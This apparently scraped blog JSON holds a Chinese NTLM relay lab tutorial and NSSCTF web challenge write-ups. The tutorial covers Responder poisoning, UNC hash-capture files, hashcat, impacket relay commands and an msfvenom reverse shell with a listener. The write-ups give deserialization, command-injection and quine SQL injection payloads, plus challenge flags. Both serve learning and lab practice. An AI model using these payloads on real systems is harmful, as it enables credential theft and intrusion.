Hash，然后向服务端发送Negotiate协商消息，去指定需要协商认证的用户、机器以及其他相关信息。 2）服务端接收到Negotiate协商消息之后，会将数据传输给NTLM SSP进行处理，然后获得一个返回的16位随机值，称之为Challenge，将其发送给客户端，并在本地缓存该Challenge。 3）客户端提取出来Challenge之后，使用本地缓存的NTLM Hash值对其进行加密，得到的值成为Net-NTLM Hash，然后将该值封装到Authenticate认证消息中传输给服务端。 4）服务端收到认证消息之后，会使用自己的密码对应的NTLM Hash值对本地缓存的Challenge进行哈希处理，然后将得到的值与认证消息中的Net-NTLM Hash进行比较，如果匹配则认证通过。 在域环境下，唯一不一样的就是，服务端会向域控请求校验。 原理之前说过hash的分类，简单分为LM hash、Net-NTLM Hash v1和Net-NTLM Hash v2现在一般都是Net-NTLM Hash v2，破解和爆破都比较困难，所以一般获取不到明文。ntlm relay的原理可以简述为，存在一个中间人，也就是攻击者，然后客户端认为他是服务端，服务端认为他是客户端。所以全程客户端都在和攻击者进行交互，然后攻击者将获得到的信息拿来和服务端交互，所以服务端认为攻击者是客户端，这样也就达到了伪造客户端进行认证的目的。 复现Net-Ntlm relay攻击的大致思路就是在Ntlm协议认证的第三步，通过获取hash值，然后进行重放到服务器上进行验证。所以我们这里大致分为两步，第一步是获得Net-Ntlm hash值，然后是进行重放。 获取Net-ntlm hash那第一步获取hash，这里的实现方式就是让受害者把Hash传递给自己，所以说我们可以利用所有基于Ntlm协议的上层协议进行relay，比如SMB、HTTP、LDAP协议。 通过Responder或者Inveigh工具这两个工具的原理是LLMNR和NetBIOS欺骗。 LLMNR全称链路本地多播名称解析，是基于域名系统（DNS）数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。简单理解为就是一种在局域网内寻找主机的协议。 NetBios全称网络基本输入输出系统，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。NetBIOS也是计算机的标识名称，主要用于局域网内计算机的互访。NetBIOS的工作流程就是正常的机器名解析查询应答过程。在Windows操作系统中，默认情况下在安装TCP/IP协议后会自动安装NetBIOS。 Windows解析主机名的顺序为： 1）查看本地hosts文件2）查看DNS缓存或者DNS服务器中进行查找3）利用LLMNR（链路本地多播名称解析）和NetBIOS名称服务进行查找 在局域网环境下，当用户输入了一个不存在的，或者错误的，DNS中不存在的主机名的时候，Windows系统根据主机名解析的顺序开始查找，最终在局域网内广播LLMNR/NBNS数据包来请求解析主机名。所以当我们在攻击机上进行监听，然后在被攻击机上进行广播查找，当LLMNR（链路本地多播名称解析）和NetBIOS名称服务进行查找时，我们就可以抓到被攻击机的hash。 Responder下载链接：https://github.com/lgandx/Responder 环境：攻击机：kali被攻击机：win10 然后我们在攻击机（kali）上执行下面的命令 1234567sudo responder -I eth0 -v -F on -w on -I eth0: 指定要监听的网络接口-v: 输出详细的调试信息。-F on: 打开 NTLMv1/NTLMv2/LMv2/Fallback 密码哈希的抓取和中继功能。-w on: 打开 WPAD 代理欺骗功能。 然后在被攻击机上访问一个不存在的主机，使得被攻击机进行广播，这里随便输一个\\\\dddddd或者在终端执行net use \\\\dddddd，这里是利用SMB协议进行中继攻击，所以这里是SMB Relay。返回kali，看到已经抓到了net-ntlm hash 其实这里的原理是LLMNR&amp;NBNS攻击，当用户输入任意一个不存在的名称，本地hosts文件和DNS服务器均不能正常解析该名称，所以系统就会发送LLNMR/NBNS数据包请求解析，此时Responder对目标主机进行LLNMR/NBNS毒化，并要求其输入凭据认证，然后就可以抓到目标机器的Net-Ntlm hash。 Inveigh 攻击机：win server 2016被攻击机：win 10 在攻击机的powershell下依次输入命令（这个方法我没有成功，第一次是正常的，但是一不小心关了之后，第二次开始输入命令就一直报错，目前还没有解决） 12345set-ExecutionPolicy RemoteSigned#这里选择为Y.\\Inveigh.ps1Invoke-Inveigh -ConsoleOutput Y 下面获取Net-Ntlm hash的方法，虽然和上面的方法略有不同，但是都还是要和Responder这个工具进行配合，所以这个工具非常重要 desktop.ini 环境：攻击机：kali被攻击机：win 10 每个文件夹下都有个隐藏文件desktop.ini其作用来用来指定文件夹图标等，正常情况是不可见的，可以通过修改文件夹属性去显示此文件。当图标的一些路径改成指定的UNC路径，就能收到目标机器发来的NTLM请求。 通用命名规则 UNC (Universal Naming Convention) ，也叫通用命名规范、通用命名约定，指用一种通用语法来描述网络资源（如共享文件，目录或打印机）的位置。Microsoft Windows UNC，通用命名约定或统一命名约定的简称，指定了一种通用语法来描述网络资源（如共享文件，目录或打印机）的位置。Windows系统的UNC语法具有通用形式： \\\\ComputerName\\SharedFolder\\Resource 我们先新建一个文件夹test，然后随便修改一个文件夹图标 然后取消勾选对应选项然后将该文件里的UNC路径替换为指定机器的UNC路径，这样当有人访问了test文件夹，目标机器就会去请求指定的UNC的图标资源，于是该机器就会将当前用户的Net-NTLM Hash发送给指定UNC的机器，我们在攻击机上用Responder监听，就能接受到发来的Net-NTLM Hash。这里的ip为我们攻击机的ip，修改保存之后，我们再次访问此文件夹 .scf后缀文件 SCF后缀的文件通常是Windows操作系统中使用的一种快捷方式文件。SCF文件是Shell Command File（Shell 命令文件）的缩写，它包含了一系列命令，用于执行特定的操作或打开特定的应用程序。 这个利用方法和上面的desktop.ini的原理是一样的，.scf文件中包含IconFile属性，所以explore.exe服务器会尝试获取文件夹的图标，所以打开.scf所在的文件夹时，目标机器会尝试获取文件夹的图标，那我们通过修改IconFile也就像上面一样达到访问指定UNC机器的目的了。.scf文件的基本格式如下： 1234[Shell]Command=2IconFile=\\\\10.10.10.2\\test\\test.ico[Taskbar]Command=ToggleDesktop 浏览器 复现环境：攻击机：kali被攻击机：win 10 当浏览器的访问页面含有UNC路径时，浏览器在解析该页面时也会尝试请求该UNC地址，发起NTLM认证。不同的浏览器有不同的UNC路径格式，详见《域渗透攻防指南》一书。 这里示范一下在IE浏览器下的。在网站(phpstudy)下新建 1.html ，内容如下： 12345678&lt;!doctype html&gt;&lt;htlm lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;head&gt;&lt;body&gt; &lt;script src=&quot;\\\\192.168.253.255\\test&quot;&gt;&lt;/script&gt;&lt;/html&gt; 然后在被攻击机上访问这个文件成功抓到Net-NTLM Hash，这个方法我复现的时候抓的速度还挺快的。 系统命令 复现环境：攻击机：kali被攻击机：win 10 下面列举一些常见的系统命令来访问指定的UNC路径去触发Net-NTLM Hash，详细全面命令见书《域渗透攻防指南》 12345net.exe use \\hostshareattrib.exe \\hostsharecacls.exe \\hostsharecipher.exe \\hostshareexpand.exe \\hostshare 然后Responder监听接收到了hash值 除了上面的这些方法之外还可以用Office、PDF、outlook、WPAD欺骗、打印机漏洞等，其他操作方法可以看书《域渗透攻防指南》，这里就不多赘述了。 利用Net-ntlm hash进行攻击这里在我们抓到Net-NTLM Hash之后有两种利用方法，一种是利用破解软件比如hashcat去解出明文密码，一种是中继Net-NTLM Hash。 破解Net-NTLM Hash1234hashcat -m 5600 &lt;net-ntlm hash&gt; 密码字典路径 --force --show 比如：（主要看字典强不强大）hashcat -m 5600 Administrator::WANYUE:cc1c3f0693127e2d:F1A956FBA8F6138DD687620F161C6CDA:010100000000000054EA5D5C6D49DA0163E3AABCA31110450000000002000800420053004F00470001001E00570049004E002D005400580045004B004400310051004C0049003600570004001400420053004F0047002E004C004F00430041004C0003003400570049004E002D005400580045004B004400310051004C004900360057002E00420053004F0047002E004C004F00430041004C0005001400420053004F0047002E004C004F00430041004C000800300030000000000000000000000000300000AB1E45D172BBDC200072E4A485AB24C52F15C1CA212FB8F124D857356EFE126F0A001000000000000000000000000000000000000900120048005400540050002F0077007000610064000000000000000000 /password.txt --force --show 我们抓到的这个是Net-NTLM Hash v2，密码强度较高，一般都跑不出来，所以基本都是用中继攻击。 中继Net-NTLM Hash我们知道，由于NTLM只是底层的认证协议，必须镶嵌在上层应用协议里面，消息的传输依赖于使用NTLM的上层协议，比如SMB、HTTP、LDAP等。因此，我们可以将获取到的Net-NTLM Hash Relay到其他使用NTLM进行认证的应用上。这个攻击有个前提： 目标主机没有开启smb签名。这里说一下，一般情况下域控默认开启smb签名，其余域内机器不开启。关闭SMB签名的命令如下： 1reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f 用nmap探测SMB签名是否打开命令 1nmap -p445 --script=smb-security-mode.nse -Pn IP --open Relay To SMBSMB-Relay又分为在工作组环境下和在域环境下，但是一般工作组环境下比较少。 工作组环境：在工作组环境中，工作组中的机器之间相互没有信任关系，每台机器的账号密码只是保存在自己的SAM文件中，这个时候Relay到别的机器，除非两台机器的账号密码一样，不然没有别的意义了。但是如果账号密码相同的话，为何不直接Pass The Hash攻击呢？因此在工作组环境下，Relay到其他机器不太现实。这个时候的攻击手段就是将机器Relay回机子本身。因此微软在ms08-068中对Relay到自身机器做了限制，严禁Relay到机器自身。CVE-2019-1384(Ghost Potato)就是绕过了该补丁。 域环境：在域环境中，默认普通域用户可以登录除域控外的其他所有机器(但是为了安全，企业运维人员通常会限制域用户登录的主机)，因此可以将Net-NTLM Hash Relay到域内的其他机器。如果是拿到了域控机器的Net-NTLM Hash，可以Relay到除域控外的其他所有机器(为啥不Relay到其他域控，因为域内只有域控默认开启SMB签名)。 因为工作组环境的适用环境比较少，这里主要讨论下域环境下的。 impacket下的smbrelayx.py 复现环境攻击机：kali被攻击机：win 10 123#在VPS(192.168.253.129)上执行如下命令，攻击192.168.253.128主机，并执行 whoami命令，会监听本地80和445 端口，伪造 http 和 smb 服务python3 smbrelayx.py -h 192.168.253.128 -c whoami 这里我一开始执行这个脚本的时候有个报错 12345Traceback (most recent call last): File &quot;/home/kail/桌面/impacket-0.11.0/examples/smbrelayx.py&quot;, line 1113, in &lt;module&gt; print(version.WARNING_BANNER) ^^^^^^^^^^^^^^^^^^^^^^AttributeError: module &#x27;impacket.version&#x27; has no attribute &#x27;WARNING_BANNER&#x27; 网上几乎没有看到这个报错的解决方法 这个错误提示表明在 smbrelayx.py 脚本中使用了 impacket.version.WARNING_BANNER 这个属性，但是 version 模块中没有 WARNING_BANNER 这个属性。 最终我是把脚本里的有关的两行print的代码删除了然后再次执行命令这时候只要域内主机触发了LLMNR协议即可，触发方式与上面的例子的触发方式一致，①即通过smb协议或者http协议访问一个不存在的主机②还可以访问攻击机伪造的http\\smb服务的地址输入用户名密码进行认证③还可以利用SMB协议输入下面的命令 1dir \\\\192.168.253.129\\$c 1net use \\\\192.168.253.1 这里我试了上面的所有方法，但是都没有成功，总是会显示failed，目前还没有找到解决方法然后我换成在windows下执行了，但是这里我首先遇到了一个问题就是域内的那台机器和我本机不能互ping，后面把两台机器的防火墙都关了就可以互ping了。在windows下运行脚本得保证445端口是没有被占用的，但是一般都会被占用，而且我这里是被system进程占用了，我在网上搜索之后也没有合适的方法，后面我还尝试过改脚本的端口，但是很可惜的是还是失败了，目前还不知道是什么原因。 后面我经过测试之后，感觉kali下的错误应该是由于补丁的原因，由于MS08-068漏洞进行了修复，所以无法再将Net-NTLM哈希值传回到发起请求的机器上，除非进行跨协议转发，但是该哈希值仍然可以通过中继转发给另外一台机器。这个补丁在CVE-2019-1384(Ghost Potato)被绕过。后面我用kali自带的impacket下的脚本，然后用域控的hash去进行中继然后获得win10的权限就可以正常执行，而且如果在windows下去触发的话，中继到http协议，不是smb协议那也可以 复现环境：攻击机：kali （192.168.253.129）被攻击机：windows 2016（域控，192.168.253.132） windows 10 （192.168.253.128） 12cd /usr/local/binsudo ./smbrelayx.py -h 192.168.253.128 -c whoami 也可以通过http协议触发这里我在域控下访问了一个不存在的网页，然后输入凭证返回kali看到命令已经成功执行 这个脚本也可以和其他工具联动，例如可以通过msf生成一个shell.exe，然后放置到攻击机上面。当中继攻击成功以后，可以让他下载本地的shell.exe并运行，这样，在msf中开启监听后，就可以获取到目标的shell。 现在kali上生成木马 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.235.129 LPORT=4444 -e x86/shikata_ga_nai -f exe -o ~\\shell.exe 然后在msf中设置监听 123456use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.253.129set lport 4444set AutoRunScript post/windows/manage/migraterun 然后在kali下执行 1sudo ./smbrelayx.py -h 192.168.253.128 -e ./~shell.exe 然后在目标机器上输入下面的命令进行触发，但是我这里监听了很久都没有回应，这个目前没打通 1net use \\\\192.168.253.129\\c$ Reponder下的MultiRelay.py 复现环境：攻击机：kali （192.168.253.129）被攻击机：windows 2016（域控，192.168.253.132） windows 10 （192.168.253.128） 首先在kali下修改Responder的配置 1sudo vim /usr/share/responder/Responder.conf 然后把HTTP和SMB设置为Off，禁用这两个功能，因为responder的作用只是进行欺骗，这里我的理解是，我们需要responder进行欺骗，然后用其他相应的脚本进行监听，那些脚本需要用到SMB或者是HTTP服务，所以Responder相应的功能就可以关了，而且在MultiRelay.py脚本的开头注释也有提示我们要关闭。当然只是我的理解，如果理解有误的话，请师傅们告诉我下真正原因。 修改完成之后，开始投毒欺骗 1sudo responder -I eth0 然后再新开一个窗口，执行MultiRelay.py文件 12cd /usr/share/responder/toolssudo python3 MultiRelay.py -t 192.168.253.128 -u ALL 然后在域控上触发，输入 123net use \\\\192.168.253.129或者是一个不存在的主机，比如net use \\\\xxxxxxx 然后就可以执行命令了这里的原理就是，在kali上执行命令，然后通过利用域控的hash去relay到win10上，我们进而获得win10的权限 impacket下的ntlmrelayx.py后面我才发现kali下自带了impacket，所以这次避免版本冲突，我就用的kali自带的脚本来操作的。这里的操作第一步和上面一样，先把responder对应的选项关了，然后开始投毒欺骗 然后在对应文件夹下执行命令，这里记得加sudo，不然可能会执行命令失败 12cd /usr/local/binsudo ./ntlmrelayx.py -t 192.168.253.128 -c whoami -smb2support Relay To HTTP中继到HTTP协议，基本都是用上面SMB说的三个脚本，这三个脚本也可以应用到HTTP协议中，就像impacket下的smbrelayx.py最后中继到http协议的一样，一般就是在域内的一台主机上访问一个不存在的网页，然后输入凭证 所以只要我们开始欺骗投毒并且运行脚本之后，只要域内有机器用到了SMB或者HTTP协议就会触发，使得我们成功横向移动 Relay To EWS Exchange是由Microsoft开发的一款企业级邮件服务器软件，它运行在Windows Server操作系统上。Exchange提供了一系列企业级电子邮件、日历、联系人和任务管理功能，并且可以与其他应用程序（如Outlook）无缝集成。 Exchange支持多种通信协议，包括SMTP（Simple Mail Transfer Protocol）、POP3（Post Office Protocol 3）、IMAP（Internet Message Access Protocol）和MAPI（Messaging Application Programming Interface）。因此，它可以与各种邮件客户端 和移动设备进行互操作，例如Outlook、Entourage、Web浏览器、iPhone和Android设备等。 EWS是Exchange Web Services的缩写，它是微软Exchange Server提供的一种基于Web服务的API（应用程序编程接口）。EWS允许开发人员通过HTTP协议与Exchange服务器进行通信，并访问和操作Exchange邮件、日历、联系人和任务等数据。 利用工具NtlmRelayToEWS获得被攻击者收件箱里的邮件的命令是： 1sudo python2 ntlmRelayToEWS.py -t https://192.168.253.128/EWS/exchange.asmx -r getFolder -f inbox -v 但是我这里一直报错，目前还没有复现成功。网上有师傅说在kali下会有不知名报错，在ubuntu上就可以执行。 防御 禁用LLMNR。域内机器可以在域控机器上通过”设置组策略管理”关闭多播名称解析，非域内机器也可以通过本机的”设置组策略管理”关闭LLMNR。我们在前面提到过，在局域网环境下，当用户输入了一个不存在的，或者错误的，DNS中不存在的主机名的时候，Windows系统根据主机名解析的顺序开始查找，最终在局域网内广播LLMNR/NBNS数据包来请求解析主机名。那当我们禁用了LLMNR，那就无法在域内广播来请求解析主机名。 同理，我们也可以通过禁用NetBIOS服务来达到上面那个方法说的一样的效果。 从条件出发，开启SMB签名 参考文章《域渗透攻防指南》浅谈域内ntlm relay攻击ntlm认证及ntlm relay攻击详解NTLM-relay攻击的原理与实现ntlm认证及ntlm relay攻击详解域渗透-Relay","categories":[{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录⑥--web","slug":"nss⑥","date":"2024-01-16T13:39:16.358Z","updated":"2024-01-16T13:43:37.828Z","comments":true,"path":"2024/01/16/nss⑥/","link":"","permalink":"https://qingwan.top/2024/01/16/nss%E2%91%A5/","excerpt":"比较基础的一些web题⑥","text":"比较基础的一些web题⑥ [HNCTF 2022 Week1]Interesting_httphttp伪造NSSCTF&#123;b77de8fa-f474-46c4-b7f1-5b98e61f188d&#125; [GKCTF 2021]easycms打开链接，发现是禅知7.7cmshttps://blog.csdn.net/LYJ20010728/article/details/120005727复现一下这个漏洞题目上是一个静态页面，没有什么跳转扫描到了后台网站admin.php用户名密码爆破为admin和12345看到设计页面可以导出主题导出一个看一下复制一下下载链接http://node4.anna.nssctf.cn:28861/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=把后面的Base64解码一下/var/www/html/system/tmp/theme/default/1.zip那我们换一个呢，假设换成/flag即http://node4.anna.nssctf.cn:28861/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=然后下载了一个zip文件，但是不能打开，把后缀改成php或者txt之后，即可得到flagNSSCTF&#123;2a3e11c5-9011-40e0-83d2-9acaa9407291&#125; [第五空间 2021]pklovecloud123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 &lt;?php include &#x27;flag.php&#x27;;class pkshow &#123; function echo_name() &#123; return &quot;Pk very safe^.^&quot;; &#125; &#125; class acp &#123; protected $cinder; public $neutron; public $nova; function __construct() &#123; $this-&gt;cinder = new pkshow; &#125; function __toString() &#123; if (isset($this-&gt;cinder)) return $this-&gt;cinder-&gt;echo_name(); &#125; &#125; class ace&#123; public $filename; public $openstack; public $docker; function echo_name() &#123; $this-&gt;openstack = unserialize($this-&gt;docker); $this-&gt;openstack-&gt;neutron = $heat; if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) &#123; $file = &quot;./&#123;$this-&gt;filename&#125;&quot;; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return &quot;keystone lost~&quot;; &#125; &#125; &#125; &#125; if (isset($_GET[&#x27;pks&#x27;])) &#123; $logData = unserialize($_GET[&#x27;pks&#x27;]); echo $logData; &#125; else &#123; highlight_file(__file__); &#125;?&gt; 网上有一篇wp写的很详细：https://www.ctfer.vip/note/set/2527开头看到了flag.php函数，接下来就去找找有没有什么危险函数可以让我们读取flag.php的内容。我们发现了class ace里面的file_get_contents($file)，即我们只需要让file的值为flag.php即可，接下来就是一步一步的调用了。其实就是要调用echo_name函数，那这个函数又在__toString() 被调用了这里我们就可以总结一下，__toString() 函数什么时候会被调用 __toString() 函数被调用的情况①对一个对象进行print或者echo的时候会触发__toString; ② 声明的变量赋值为对象后与字符串做弱类型比较的时候就能触发__toString ③声明的变量赋值为对象后进行正则匹配的时候就能触发__toString ④声明的变量被赋值为对象后进行strolower的时候就能触发__toString ⑤声明的变量进行实例化的时候就能触发__toString;___toString 的触发方法就是：将对象当作字符串使用 我们会发现 Class acp 中的__construct()构造函数中对$cinder 进行了实例化，而__construct()构造函数在实例化一个对象的时候就会被调用；所以最终的链子为：Class acp :: __construct() -&gt; Class acp :: __toString() -&gt; Class ace :: echo_name()我们分析一下class ace 中的 echo_name() ，我们可以发现需要满足$this-&gt;$openstack-&gt;neutron === $this-&gt;openstack-&gt;nova然后在上面有$this-&gt;$openstack = unserialize($this-&gt;docker)，因此只要我们使得$this-&gt;docker =null，然后让$this-&gt;filename=”flag.php”即可使得上面的判断成立,并且读取 flag.php 的内容，poc如下 123456789101112131415161718192021222324 &lt;?php class acp &#123; protected $cinder; public $neutron; public $nova; function __construct($a) &#123; $this-&gt;cinder = $a; &#125; &#125; class ace&#123; public $filename=&quot;flag.php&quot;; public $openstack; public $docker = null; &#125; $a = new ace;$b = new acp($a);echo urlencode(serialize($b))?&gt; 传参，查看源代码发现flag，不在这里最终poc 123456789101112131415161718192021222324 &lt;?php class acp &#123; protected $cinder; public $neutron; public $nova; function __construct($a) &#123; $this-&gt;cinder = $a; &#125; &#125; class ace&#123; public $filename=&quot;../nssctfasdasdflag&quot;; public $openstack; public $docker = null; &#125; $a = new ace;$b = new acp($a);echo urlencode(serialize($b))?&gt; payload为： 1?pks=O%3A3%3A&quot;acp&quot;%3A3%3A&#123;s%3A9%3A&quot;%00*%00cinder&quot;%3BO%3A3%3A&quot;ace&quot;%3A3%3A&#123;s%3A8%3A&quot;filename&quot;%3Bs%3A19%3A&quot;..%2Fnssctfasdasdflag&quot;%3Bs%3A9%3A&quot;openstack&quot;%3BN%3Bs%3A6%3A&quot;docker&quot;%3BN%3B&#125;s%3A7%3A&quot;neutron&quot;%3BN%3Bs%3A4%3A&quot;nova&quot;%3BN%3B&#125; NSSCTF&#123;76fe8cfb-15cb-497e-a3bc-ecdd8a2c6092&#125; [WUSTCTF 2020]朴实无华扫描一下，发现了robots.txt，然后看到了一个路由，进去这个路由然后抓包访问一下fl4g.php看到源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;金钱解决不了穷人的本质问题&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5($md5)) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;快到非洲了&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;?&gt; intval绕过&amp;弱比较md5编码前后值一样这里是一个特性。科学计数法绕过。比如3e1会被认为是3，但是3e3+1会被认为是3001这里的绕过就是也是用科学计数法，但是后面要纯数字所以最后的payload为?num=3e3&amp;md5=0e215962017&amp;get_flag=more$&#123;IFS&#125;f*NSSCTF&#123;acd27fac-8e2a-4ba9-9a17-bed2a60072bb&#125; [SWPUCTF 2022 新生赛]1z_unserialize123456789101112131415161718192021&lt;?php class lyh&#123; public $url = &#x27;NSSCTF.com&#x27;; public $lt; public $lly; function __destruct() &#123; $a = $this-&gt;lt; $a($this-&gt;lly); &#125; &#125;unserialize($_POST[&#x27;nss&#x27;]);highlight_file(__FILE__); ?&gt; 应该是反序列化的签到题直接上poc 123456789101112&lt;?php class lyh&#123; public $url = &#x27;NSSCTF.com&#x27;; public $lt; public $lly;&#125;$a=new lyh;$a-&gt;lt=system;$a-&gt;lly=&quot;cat /f*&quot;;echo serialize($a);?&gt; payload为 1nss=O:3:&quot;lyh&quot;:3:&#123;s:3:&quot;url&quot;;s:10:&quot;NSSCTF.com&quot;;s:2:&quot;lt&quot;;s:6:&quot;system&quot;;s:3:&quot;lly&quot;;s:7:&quot;cat /f*&quot;;&#125; NSSCTF&#123;fc6fe9fc-af30-4420-a63c-ea50b469bf0b&#125; [SWPUCTF 2022 新生赛]where_am_iemmmm脑洞题 有点那个了题目的图片搜索 然后得到店家的电话提交NSSCTF&#123;33652a44-3323-426b-ae94-121f3e969f35&#125; [第五空间 2021]yet_another_mysql_injection点开题目，F12看到提示，拿到源代码 12345678910111213141516171819202122232425262728293031323334353637 &lt;?phpinclude_once(&quot;lib.php&quot;);function alertMes($mes,$url)&#123; die(&quot;&lt;script&gt;alert(&#x27;&#123;$mes&#125;&#x27;);location.href=&#x27;&#123;$url&#125;&#x27;;&lt;/script&gt;&quot;);&#125;function checkSql($s) &#123; if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123; alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;); &#125;&#125;if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] != &#x27;&#x27; &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;password&#x27;] != &#x27;&#x27;) &#123; $username=$_POST[&#x27;username&#x27;]; $password=$_POST[&#x27;password&#x27;]; if ($username !== &#x27;admin&#x27;) &#123; alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;); &#125; checkSql($password); $sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;; $user_result=mysqli_query($con,$sql); $row = mysqli_fetch_array($user_result); if (!$row) &#123; alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;); //password不能为空，并且username为admin &#125; if ($row[&#x27;password&#x27;] === $password) &#123; die($FLAG); &#125; else &#123; alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;); //password要和查询到的password相同 &#125;&#125;if(isset($_GET[&#x27;source&#x27;]))&#123; show_source(__FILE__); die;&#125;?&gt; 审计一下代码，可以知道我们在主页要用admin这个用户名登录，然后密码是注入点，但是这里绕过了很多东西这里要求我们传入的username必须为admin，而且我们输入的密码必须和存储的查询的密码相同，才可以登录然后这里的password也用正则绕过了很多东西，从上面的源码可以看到，输入的sql语句查询的数据库为user。那我们这里可以用联合注入进行查询，正则过滤的东西用其他代替就可以了。这里还是无回显，所以我们这里应该用盲注 sql的过滤123456789sleep 可以用benchmark代替 &lt;,&gt; 可以用least(),greatest()代替 =,in 可以用like代替 substr 可以用mid代替空格 可以用/**/代替 quine注入参考文章：https://www.anquanke.com/post/id/253570https://blog.csdn.net/qq_35782055/article/details/130348274 那这里要求的是$sql执行的结果与$password相同，我们本来要满足的条件是我们输入的密码和查询到的密码是相同的，但是这里我们使得我们的输入和输出是一致的，也可以达到效果。Quine又叫做自产生程序，在sql注入技术中，这是一种使得输入的sql语句和输出的sql语句一致的技术，常用于一些特殊的登陆绕过sql注入中。 根据上面的参考文章，我们可以知道Quine注入基本的原理其实就是套娃，可以描述为如下形式 1REPLACE(str,编码的间隔符,str) str可描述为如下形式： 1REPLACE(间隔符,编码的间隔符,间隔符) 这样运算后，最后的结果又是： 1REPLACE(str,编码的间隔符,str) 所以比如这个语句 1REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;) 他的输入输出都是不变的 所以这道题，其中1&#39;/**/union/**/select/**/replace(replace(&#39;str&#39;,char(34),char(39)),char(46),&#39;str&#39;)#是Quine的基本形式而str的基本形式为1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#如果char被过滤了，可以使用chr和0x绕过 123char(34),char(39)chr(34),chr(39)0x22,0x27 最后的payload为 1&#x27;/**/union/**/select(REPLACE(REPLACE(&#x27;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;))#&#x27;,CHAR(34),CHAR(39)),CHAR(33),&#x27;&quot;/**/union/**/select(REPLACE(REPLACE(&quot;!&quot;,CHAR(34),CHAR(39)),CHAR(33),&quot;!&quot;))#&#x27;))# 先用&#39;去闭合password参数里的引号，然后再用联合查询语句，这里还涉及单引号双引号的问题，所以把要先把双引号替换为单引号，再替换一下被正则过滤的那些字符NSSCTF&#123;28c8ada1-d8ed-4a75-af12-f0b0da64ff6e&#125; 这里还有一个非预期解，扫一下后台 1dirsearch -u http://node4.anna.nssctf.cn:28703/ -e* 扫到了/phpmyadmin/ 然后直接admin/admin弱密码登录，最后在user表找到密码，但是我们用注入的时候是在表里查不到密码的，而且这里后面好像把这个非预期给修了 [MoeCTF 2022]baby_file打开环境 123456789101112&lt;html&gt;&lt;title&gt;Here&#x27;s a secret. Can you find it?&lt;/title&gt;&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; include($file);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;&lt;/html&gt; GET传参 1/?file=php://filter/convert.base64-encode/resource=flag.php NSSCTF&#123;70497173-c989-4054-9d6d-417be2cad52e&#125; [SWPUCTF 2022 新生赛]xffhttp头伪造 12X-Forwarded-For: 127.0.0.1Referer: node5.anna.nssctf.cn:28983 NSSCTF&#123;th1s_xff_1s_e4ay&#125; [SWPUCTF 2022 新生赛]numgame这道题f12和开发者模式怎么都打不开源码，最后先在一个网页打开F12，然后再在那个网页访问链接在JS文件源码里发现注释，访问文件NsScTf.php 12345678910111213141516 &lt;?phperror_reporting(0);//hint: 与get相似的另一种请求协议是什么呢include(&quot;flag.php&quot;);class nss&#123; static function ctf()&#123; include(&quot;./hint2.php&quot;); 